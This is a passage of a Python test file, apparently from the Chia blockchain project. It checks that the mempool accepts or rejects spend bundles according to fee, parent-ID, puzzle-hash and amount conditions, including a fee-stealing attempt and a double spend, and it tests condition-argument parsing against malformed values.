[int_to_bytes(10)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, fee=9)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert mempool_bundle is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.RESERVE_FEE_CONDITION_FAILED\n    @pytest.mark.asyncio\n    async def test_stealing_fee(self, two_nodes):\n        reward_ph = WALLET_A.get_new_puzzlehash()\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        start_height = blocks[-1].height\n        blocks = bt.get_consecutive_blocks(\n            5,\n            block_list_input=blocks,\n            guarantee_transaction_block=True,\n            farmer_reward_puzzle_hash=reward_ph,\n            pool_reward_puzzle_hash=reward_ph,\n        )\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        peer = await connect_and_get_peer(server_1, server_2)\n        for block in blocks:\n            await full_node_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        await time_out_assert(60, node_height_at_least, True, full_node_1, start_height + 5)\n        receiver_puzzlehash = BURN_PUZZLE_HASH\n        cvp = ConditionWithArgs(ConditionOpcode.RESERVE_FEE, [int_to_bytes(10)])\n        dic = {cvp.opcode: [cvp]}\n        fee = 9\n        coin_1 = list(blocks[-2].get_included_reward_coins())[0]\n        coin_2 = None\n        for coin in list(blocks[-1].get_included_reward_coins()):\n            if coin.amount == coin_1.amount:\n                coin_2 = coin\n        spend_bundle1 = generate_test_spend_bundle(coin_1, dic, uint64(fee))\n        steal_fee_spendbundle = WALLET_A.generate_signed_transaction(\n            coin_1.amount + fee - 4, receiver_puzzlehash, coin_2\n        )\n        assert spend_bundle1 is not None\n        assert steal_fee_spendbundle is not None\n        combined = SpendBundle.aggregate([spend_bundle1, steal_fee_spendbundle])\n        assert combined.fees() == 4\n        tx1: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle1)\n        status, err = await respond_transaction(full_node_1, tx1, peer)\n        mempool_bundle = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert mempool_bundle is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.RESERVE_FEE_CONDITION_FAILED\n    @pytest.mark.asyncio\n    async def test_double_spend_same_bundle(self, two_nodes):\n        reward_ph = WALLET_A.get_new_puzzlehash()\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        start_height = blocks[-1].height\n        blocks = bt.get_consecutive_blocks(\n            3,\n            block_list_input=blocks,\n            guarantee_transaction_block=True,\n            farmer_reward_puzzle_hash=reward_ph,\n            pool_reward_puzzle_hash=reward_ph,\n        )\n        peer = await connect_and_get_peer(server_1, server_2)\n        for block in blocks:\n            await full_node_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        await time_out_assert(60, node_height_at_least, True, full_node_1, start_height + 3)\n        coin = list(blocks[-1].get_included_reward_coins())[0]\n        spend_bundle1 = generate_test_spend_bundle(coin)\n        assert spend_bundle1 is not None\n        spend_bundle2 = generate_test_spend_bundle(\n            coin,\n            new_puzzle_hash=BURN_PUZZLE_HASH_2,\n        )\n        assert spend_bundle2 is not None\n        spend_bundle_combined = SpendBundle.aggregate([spend_bundle1, spend_bundle2])\n        tx: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle_combined)\n        status, err = await respond_transaction(full_node_1, tx, peer)\n        sb = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle_combined.name())\n        assert sb is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.DOUBLE_SPEND\n    @pytest.mark.asyncio\n    async def test_agg_sig_condition(self, two_nodes):\n        reward_ph = WALLET_A.get_new_puzzlehash()\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        start_height = blocks[-1].height\n        blocks = bt.get_consecutive_blocks(\n            3,\n            block_list_input=blocks,\n            guarantee_transaction_block=True,\n            farmer_reward_puzzle_hash=reward_ph,\n            pool_reward_puzzle_hash=reward_ph,\n        )\n        for block in blocks:\n            await full_node_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        await time_out_assert(60, node_height_at_least, True, full_node_1, start_height + 3)\n        coin = list(blocks[-1].get_included_reward_coins())[0]\n        spend_bundle_0 = generate_test_spend_bundle(coin)\n        unsigned: List[CoinSpend] = spend_bundle_0.coin_spends\n        assert len(unsigned) == 1\n        coin_spend: CoinSpend = unsigned[0]\n        err, con, cost = conditions_for_solution(coin_spend.puzzle_reveal, coin_spend.solution, INFINITE_COST)\n        assert con is not None\n    @pytest.mark.asyncio\n    async def test_correct_my_parent(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        coin = list(blocks[-1].get_included_reward_coins())[0]\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_PARENT_ID, [coin.parent_coin_info])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, coin=coin)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_my_parent_garbage(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        coin = list(blocks[-1].get_included_reward_coins())[0]\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_PARENT_ID, [coin.parent_coin_info, b\"garbage\"])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, coin=coin)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_my_parent_missing_arg(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_PARENT_ID, [])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.INVALID_CONDITION\n    @pytest.mark.asyncio\n    async def test_invalid_my_parent(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        coin = list(blocks[-1].get_included_reward_coins())[0]\n        coin_2 = list(blocks[-2].get_included_reward_coins())[0]\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_PARENT_ID, [coin_2.parent_coin_info])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, coin=coin)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.ASSERT_MY_PARENT_ID_FAILED\n    @pytest.mark.asyncio\n    async def test_correct_my_puzhash(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        coin = list(blocks[-1].get_included_reward_coins())[0]\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_PUZZLEHASH, [coin.puzzle_hash])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, coin=coin)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_my_puzhash_garbage(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        coin = list(blocks[-1].get_included_reward_coins())[0]\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_PUZZLEHASH, [coin.puzzle_hash, b\"garbage\"])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, coin=coin)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_my_puzhash_missing_arg(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_PUZZLEHASH, [])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.INVALID_CONDITION\n    @pytest.mark.asyncio\n    async def test_invalid_my_puzhash(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        coin = list(blocks[-1].get_included_reward_coins())[0]\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_PUZZLEHASH, [Program.to([]).get_tree_hash()])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, coin=coin)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.ASSERT_MY_PUZZLEHASH_FAILED\n    @pytest.mark.asyncio\n    async def test_correct_my_amount(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        coin = list(blocks[-1].get_included_reward_coins())[0]\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_AMOUNT, [int_to_bytes(coin.amount)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, coin=coin)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_my_amount_garbage(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        coin = list(blocks[-1].get_included_reward_coins())[0]\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_AMOUNT, [int_to_bytes(coin.amount), b\"garbage\"])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic, coin=coin)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is spend_bundle1\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n    @pytest.mark.asyncio\n    async def test_my_amount_missing_arg(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_AMOUNT, [])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.INVALID_CONDITION\n    @pytest.mark.asyncio\n    async def test_invalid_my_amount(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_AMOUNT, [int_to_bytes(1000)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.ASSERT_MY_AMOUNT_FAILED\n    @pytest.mark.asyncio\n    async def test_negative_my_amount(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_AMOUNT, [int_to_bytes(-1)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.ASSERT_MY_AMOUNT_FAILED\n    @pytest.mark.asyncio\n    async def test_my_amount_too_large(self, two_nodes):\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        cvp = ConditionWithArgs(ConditionOpcode.ASSERT_MY_AMOUNT, [int_to_bytes(2 ** 64)])\n        dic = {cvp.opcode: [cvp]}\n        blocks, spend_bundle1, peer, status, err = await self.condition_tester(two_nodes, dic)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        assert sb1 is None\n        assert status == MempoolInclusionStatus.FAILED\n        assert err == Err.ASSERT_MY_AMOUNT_FAILED\nclass TestConditionParser:\n    @pytest.mark.parametrize(\"safe_mode\", [True, False])\n    def test_parse_condition_agg_sig(self, safe_mode: bool):\n        valid_pubkey = b\"b\" * 48\n        short_pubkey = b\"b\" * 47\n        long_pubkey = b\"b\" * 49\n        valid_message = b\"a\" * 1024\n        long_message = b\"a\" * 1025\n        empty_message = b\"\"\n        for condition_code in [ConditionOpcode.AGG_SIG_UNSAFE, ConditionOpcode.AGG_SIG_ME]:\n            cost, args = parse_condition_args(SExp.to([valid_pubkey, valid_message]), condition_code, safe_mode)\n            assert cost == ConditionCost.AGG_SIG.value\n            assert args == [valid_pubkey, valid_message]\n            with pytest.raises(ValidationError):\n                cost, args = parse_condition_args(SExp.to([valid_pubkey, long_message]), condition_code, safe_mode)\n            cost, args = parse_condition_args(SExp.to([valid_pubkey, empty_message]), condition_code, safe_mode)\n            assert cost == ConditionCost.AGG_SIG.value\n            assert args == [valid_pubkey, empty_message]\n            with pytest.raises(ValidationError):\n                cost, args = parse_condition_args(SExp.to([short_pubkey, valid_message]), condition_code, safe_mode)\n            with pytest.raises(ValidationError):\n                cost, args = parse_condition_args(SExp.to([long_pubkey, valid_message]), condition_code, safe_mode)\n            with pytest.raises(EvalError):\n                cost, args = parse_condition_args(SExp.to([valid_pubkey]), condition_code, safe_mode)\n            with pytest.raises(EvalError):\n                cost, args = parse_condition_args(SExp.to([]), condition_code, safe_mode)\n            with pytest.raises(ValidationError):\n                cost, args = parse_condition_args(\n                    SExp.to([valid_pubkey, valid_message, b\"garbage\"]), condition_code, safe_mode\n                )\n            cost, args = parse_condition_args(\n                SExp.to((valid_pubkey, (valid_message, b\"garbage\"))), condition_code, safe_mode\n            )\n            assert cost == ConditionCost.AGG_SIG.value\n            assert args == [valid_pubkey, valid_message]\n    @pytest.mark.parametrize(\"safe_mode\", [True, False])\n    def test_parse_condition_create_coin(self, safe_mode: bool):\n        valid_hash = b\"b\" * 32\n        short_hash = b\"b\" * 31\n        long_hash = b\"b\" * 33\n        valid_amount = int_to_bytes(1000000000)\n        large_amount = int_to_bytes(2 ** 64)\n        leading_zeros_amount = bytes([0] * 100) + int_to_bytes(1000000000)\n        negative_amount = int_to_bytes(-1000)\n        large_negative_amount = bytes([0xFF] * 100) + int_to_bytes(-1)\n        cost, args = parse_condition_args(SExp.to([valid_hash, valid_amount]), ConditionOpcode.CREATE_COIN, safe_mode)\n        assert cost == ConditionCost.CREATE_COIN.value\n        assert args == [valid_hash, valid_amount]\n        if safe_mode:\n            with pytest.raises(ValidationError):\n                parse_condition_args(\n                    SExp.to([valid_hash, leading_zeros_amount]), ConditionOpcode.CREATE_COIN, safe_mode\n                )\n        else:\n            cost, args = parse_condition_args(\n                SExp.to([valid_hash, leading_zeros_amount]), ConditionOpcode.CREATE_COIN, safe_mode\n            )\n            assert cost == ConditionCost.CREATE_COIN.value\n            assert args == [valid_hash, valid_amount]\n        with pytest.raises(ValidationError):\n            cost, args = parse_condition_args(\n                SExp.to([valid_hash, large_amount]), ConditionOpcode.CREATE_COIN, safe_mode\n            )\n        with pytest.raises(ValidationError):\n            cost, args = parse_condition_args(\n                SExp.to([short_hash, valid_amount]), ConditionOpcode.CREATE_COIN, safe_mode\n            )\n        with pytest.raises(ValidationError):\n            cost, args = parse_condition_args(\n                SExp.to([long_hash, valid_amount]), ConditionOpcode.CREATE_COIN, safe_mode\n            )\n        with pytest.raises(ValidationError):\n            cost, args = parse_condition_args(\n                SExp.to([valid_hash, negative_amount]), ConditionOpcode.CREATE_COIN, safe_mode\n            )\n        with pytest.raises(ValidationError):\n            cost, args = parse_condition_args(\n                SExp.to([valid_hash, large_negative_amount]), ConditionOpcode.CREATE_COIN, safe_mode\n            )\n        with pytest.raises(EvalError):\n            cost, args = parse_condition_args(SExp.to([valid_hash]), ConditionOpcode.CREATE_COIN, safe_mode)\n        with pytest.raises(EvalError):\n            cost, args = parse_condition_args(SExp.to([]), ConditionOpcode.CREATE_COIN, safe_mode)\n        cost, args = parse_condition_args(\n            SExp.to([valid_hash, valid_amount, b\"garbage\"]), ConditionOpcode.CREATE_COIN, safe_mode\n        )\n        assert cost == ConditionCost.CREATE_COIN.value\n        assert args == [valid_hash, valid_amount]\n    @pytest.mark.parametrize(\"safe_mode\", [True, False])\n    def test_parse_condition_seconds(self, safe_mode: bool):\n        valid_timestamp = int_to_bytes(100)\n        leading_zeros_timestamp = bytes([0] * 100) + int_to_bytes(100)\n        negative_timestamp = int_to_bytes(-100)\n        large_negative_timestamp = bytes([0xFF] * 100) + int_to_bytes(-1)\n        for condition_code in [ConditionOpcode.ASSERT_SECONDS_ABSOLUTE, ConditionOpcode.ASSERT_SECONDS_RELATIVE]:\n            cost, args = parse_condition_args(SExp.to([valid_timestamp]), condition_code, safe_mode)\n            assert cost == 0\n            assert args == [valid_timestamp]\n            if safe_mode:\n                with pytest.raises(ValidationError):\n                    parse_condition_args(SExp.to([leading_zeros_timestamp]), condition_code, safe_mode)\n            else:\n                cost, args = parse_condition_args(SExp.to([leading_zeros_timestamp]), condition_code, safe_mode)\n                assert cost == 0\n                assert args == [valid_timestamp]\n            cost, args = parse_condition_args(SExp.to([negative_timestamp]), condition_code, safe_mode)\n            assert cost == 0\n            assert args is None\n            cost, args = parse_condition_args(SExp.to([large_negative_timestamp]), condition_code, safe_mode)\n            assert cost == 0\n            assert args is None\n            cost, args = parse_condition_args(SExp.to([valid_timestamp, b\"garbage\"]), condition_code, safe_mode)\n            assert cost == 0\n            assert args == [valid_timestamp]\n            with pytest.raises(EvalError):\n                cost, args = parse_condition_args(SExp.to([]), condition_code, safe_mode)\n    @pytest.mark.parametrize(\"safe_mode\", [True, False])\n    def test_parse_condition_height(self, safe_mode: bool):\n        valid_height = int_to_bytes(100)\n        leading_zeros_height = bytes([0] * 100) + int_to_bytes(100)\n        negative_height = int_to_bytes(-100)\n        large_negative_height = bytes([0xFF] * 100) + int_to_bytes(-1)\n        for condition_code in [ConditionOpcode.ASSERT_HEIGHT_ABSOLUTE, ConditionOpcode.ASSERT_HEIGHT_RELATIVE]:\n            cost, args = parse_condition_args(SExp.to([valid_height]), condition_code, safe_mode)\n            assert cost == 0\n            assert args == [valid_height]\n            if safe_mode:\n                with pytest.raises(ValidationError):\n                    parse_condition_args(SExp.to([leading_zeros_height]), condition_code, safe_mode)\n            else:\n                cost, args = parse_condition_args(SExp.to([leading_zeros_height]), condition_code, safe_mode)\n                assert cost == 0\n                assert args == [valid_height]\n            cost, args = parse_condition_args(SExp.to([negative_height]), condition_code, safe_mode)\n            assert cost == 0\n            assert args is None\n            cost, args = parse_condition_args(SExp.to([large_negative_height]), condition_code, safe_mode)\n            assert cost == 0\n            assert args is None\n            cost, args = parse_condition_args(SExp.to([valid_height, b\"garbage\"]), condition_code, safe_mode)\n            assert cost == 0\n            assert args == [valid_height]\n            with pytest.raises(EvalError):\n                cost, args = parse_condition_args(SExp.to([]), condition_code, safe_mode)\n    @pytest.mark.parametrize(\"safe_mode\", [True, False])\n    def test_parse_condition_coin_id(self, safe_mode: bool):\n        valid_coin_id = b\"a\" * 32\n        short_coin_id = b\"a\" * 31\n        long_coin_id = b\"a\" * 33\n        for condition_code in [ConditionOpcode.ASSERT_MY_COIN_ID, ConditionOpcode.ASSERT_MY_PARENT_ID]:\n            cost, args = parse_condition_args(SExp.to([valid_coin_id]), condition_code, safe_mode)\n            assert cost == 0\n            assert args == [valid_coin_id]\n            with pytest.raises(ValidationError):\n                cost, args = parse_condition_args(SExp.to([short_coin_id]), condition_code, safe_mode)\n            with pytest.raises(ValidationError):\n                cost, args = parse_condition_args(SExp.to([long_coin_id]), condition_code, safe_mode)\n            cost, args = parse_condition_args(SExp.to([valid_coin_id, b\"garbage\"]), condition_code, safe_mode)\n            assert cost == 0\n            assert args == [valid_coin_id]\n            with pytest.raises(EvalError):\n                cost, args = parse_condition_args(SExp.to([]), condition_code, safe_mode)\n    @pytest.mark.parametrize(\"safe_mode\", [True, False])\n    def test_parse_condition_fee(self, safe_mode: bool):\n        valid_fee = int_to_bytes(100)\n        leading_zeros_fee = bytes([0] * 100) + int_to_bytes(100)\n        negative_fee = int_to_bytes(-100)\n        large_negative_fee = bytes([0xFF] * 100) + int_to_bytes(-1)\n        large_fee = int_to_bytes(2 ** 64)\n        cost, args = parse_condition_args(SExp.to([valid_fee]), ConditionOpcode.RESERVE_FEE, safe_mode)\n        assert cost == 0\n        assert args == [valid_fee]\n        if safe_mode:\n            with pytest.raises(ValidationError):\n                parse_condition_args(SExp.to([leading_zeros_fee]), ConditionOpcode.RESERVE_FEE, safe_mode)\n        else:\n            cost, args = parse_condition_args(SExp.to([leading_zeros_fee]), ConditionOpcode.RESERVE_FEE, safe_mode)\n            assert cost == 0\n            assert args == [valid_fee]\n        with pytest.raises(ValidationError):\n            cost, args = parse_condition_args(SExp.to([negative_fee]), ConditionOpcode.RESERVE_FEE, safe_mode)\n        with pytest.raises(ValidationError):\n            cost, args = parse_condition_args(SExp.to([large_fee]), ConditionOpcode.RESERVE_FEE, safe_mode)\n        with pytest.raises(ValidationError):\n            cost, args = parse_condition_args(SExp.to([large_negative_fee]), ConditionOpcode.RESERVE_FEE, safe_mode)\n        cost, args = parse_condition_args(SExp.to([valid_fee, b\"garbage\"]), ConditionOpcode.RESERVE_FEE, safe_mode)\n        assert cost == 0\n        assert args == [valid_fee]\n        with pytest.raises(EvalError):\n            cost, args = parse_condition_args(SExp.to([]), ConditionOpcode.RESERVE_FEE, safe_mode)\n    @pytest.mark.parametrize(\"safe_mode\", [True, False])\n    def test_parse_condition_create_announcement(self, safe_mode: bool):\n        valid_msg = b\"a\" * 1024\n        long_msg = b\"a\" * 1025\n        empty_msg = b\"\"\n        for condition_code in [ConditionOpcode.CREATE_COIN_ANNOUNCEMENT, ConditionOpcode.CREATE_PUZZLE_ANNOUNCEMENT]:\n            cost, args = parse_condition_args(SExp.to([valid_msg]), condition_code, safe_mode)\n            assert cost == 0\n            assert args == [valid_msg]\n            cost, args = parse_condition_args(SExp.to([empty_msg]), condition_code, safe_mode)\n            assert cost == 0\n            assert args == [empty_msg]\n            with pytest.raises(ValidationError):\n                cost, args = parse_condition_args(SExp.to([long_msg]), condition_code, safe_mode)\n            with pytest.raises(EvalError):\n                cost, args = parse_condition_args(SExp.to([]), condition_code, safe_mode)\n    @pytest.mark.parametrize(\"safe_mode\", [True, False])\n    def test_parse_condition_assert_announcement(self, safe_mode: bool):\n        valid_hash = b\"b\" * 32\n        short_hash = b\"b\" * 31\n        long_hash = b\"b\" * 33\n        for condition_code in [\n            ConditionOpcode.ASSERT_COIN_ANNOUNCEMENT,\n            ConditionOpcode.ASSERT_PUZZLE_ANNOUNCEMENT,\n            ConditionOpcode.ASSERT_MY_PUZZLEHASH,\n        ]:\n            cost, args = parse_condition_args(SExp.to([valid_hash]), condition_code, safe_mode)\n            assert cost == 0\n            assert args == [valid_hash]\n            with pytest.raises(ValidationError):\n                cost, args = parse_condition_args(SExp.to([short_hash]), condition_code, safe_mode)\n            with pytest.raises(ValidationError):\n                cost, args = parse_condition_args(SExp.to([long_hash]), condition_code, safe_mode)\n            with pytest.raises(EvalError):\n                cost, args = parse_condition_args(SExp.to([]), condition_code, safe_mode)\n    @pytest.mark.parametrize(\"safe_mode\", [True, False])\n    def test_parse_condition_my_amount(self, safe_mode: bool):\n        valid_amount = int_to_bytes(100)\n        leading_zeros_amount = bytes([0] * 100) + int_to_bytes(100)\n        negative_amount = int_to_bytes(-100)\n        large_negative_amount = bytes([0xFF] * 100) + int_to_bytes(-1)\n        large_amount = int_to_bytes(2 ** 64)\n        cost, args = parse_condition_args(SExp.to([valid_amount]), ConditionOpcode.ASSERT_MY_AMOUNT, safe_mode)\n        assert cost == 0\n        assert args == [valid_amount]\n        if safe_mode:\n            with pytest.raises(ValidationError):\n                parse_condition_args(SExp.to([leading_zeros_amount]), ConditionOpcode.ASSERT_MY_AMOUNT, safe_mode)\n        else:\n            cost, args = parse_condition_args(\n                SExp.to([leading_zeros_amount]), ConditionOpcode.ASSERT_MY_AMOUNT, safe_mode\n            )\n            assert cost == 0\n            assert args == [valid_amount]\n        with pytest.raises(ValidationError):\n            cost, args = parse_condition_args(SExp.to([negative_amount]), ConditionOpcode.ASSERT_MY_AMOUNT, safe_mode)\n        with pytest.raises(ValidationError):\n            cost, args = parse_condition_args(SExp.to([large_amount]), ConditionOpcode.ASSERT_MY_AMOUNT, safe_mode)\n        with pytest.raises(ValidationError):\n            cost, args = parse_condition_args(\n                SExp.to([large_negative_amount]), ConditionOpcode.ASSERT_MY_AMOUNT, safe_mode\n            )\n        cost, args = parse_condition_args(\n            SExp.to([valid_amount, b\"garbage\"]), ConditionOpcode.ASSERT_MY_AMOUNT, safe_mode\n        )\n        assert cost == 0\n        assert args == [valid_amount]\n        with pytest.raises(EvalError):\n            cost, args = parse_condition_args(SExp.to([]), ConditionOpcode.ASSERT_MY_AMOUNT, safe_mode)\n    def test_parse_unknown_condition(self):\n        for opcode in [129, 0, 1, 1000, 74]:\n            with pytest.raises(ValidationError):\n                cost, args = parse_condition_args(SExp.to([b\"test\"]), opcode, False)\n            with pytest.raises(ValidationError):\n                cost, args = parse_condition_args(SExp.to([b\"foo\", b\"bar\"]), opcode, False)\n            with pytest.raises(ValidationError):\n                cost, args = parse_condition_args(SExp.to([]), opcode, False)\n    def test_parse_condition(self):\n        for opcode in [129, 0, 1, 1000, 74]:\n            with pytest.raises(ValidationError):\n                cost, args = parse_condition(SExp.to([int_to_bytes(opcode), b\"test\"]), safe_mode=True)\n            with pytest.raises(ValidationError):\n                cost, args = parse_condition(SExp.to([int_to_bytes(opcode), b\"foo\", b\"bar\"]), safe_mode=True)\n            with pytest.raises(ValidationError):\n                cost, args = parse_condition(SExp.to([int_to_bytes(opcode)]), safe_mode=True)\n            assert (0, None) == parse_condition(SExp.to([int_to_bytes(opcode), b\"test\"]), safe_mode=False)\n            assert (0, None) == parse_condition(SExp.to([int_to_bytes(opcode), b\"foo\", b\"bar\"]), safe_mode=False)\n            assert (0, None) == parse_condition(SExp.to([int_to_bytes(opcode)]), safe_mode=False)\nCOST_PER_BYTE = 12000\nMAX_BLOCK_COST_CLVM = 11000000000\ndef generator_condition_tester(\n    conditions: str,\n    *,\n    rust_checker: bool,\n    safe_mode: bool = False,\n    quote: bool = True,\n    max_cost: int = MAX_BLOCK_COST_CLVM,\n) -> NPCResult:\n    prg = f\"(q ((0x0101010101010101010101010101010101010101010101010101010101010101 {'(q ' if quote else ''} {conditions} {')' if quote else ''} 123 (() (q . ())))))\"  \n    print(f\"program: {prg}\")\n    program = SerializedProgram.from_bytes(binutils.assemble(prg).as_bin())\n    generator = BlockGenerator(program, [])\n    print(f\"len: {len(bytes(program))}\")\n    npc_result: NPCResult = get_name_puzzle_conditions(\n        generator, max_cost, cost_per_byte=COST_PER_BYTE, safe_mode=safe_mode, rust_checker=rust_checker\n    )\n    return npc_result\nclass TestGeneratorConditions:\n    @pytest.mark.parametrize(\"rust_checker\", [True, False])\n    def test_invalid_condition_args_terminator(self, rust_checker: bool):\n        npc_result = generator_condition_tester(\"(80 50 . 1)\", rust_checker=rust_checker)\n        assert npc_result.error is None\n        assert len(npc_result.npc_list) == 1\n        opcode = ConditionOpcode(bytes([80]))\n        assert len(npc_result.npc_list[0].conditions) == 1\n        assert npc_result.npc_list[0].conditions[0][0] == opcode\n        assert len(npc_result.npc_list[0].conditions[0][1]) == 1\n        c = npc_result.npc_list[0].conditions[0][1][0]\n        assert c == ConditionWithArgs(opcode=ConditionOpcode.ASSERT_SECONDS_RELATIVE, vars=[bytes([50])])\n    @pytest.mark.parametrize(\"rust_checker\", [True, False])\n    def test_invalid_condition_list_terminator(self, rust_checker: bool):\n        npc_result = generator_condition_tester(\"(80 50) . 3\", rust_checker=rust_checker)\n        assert 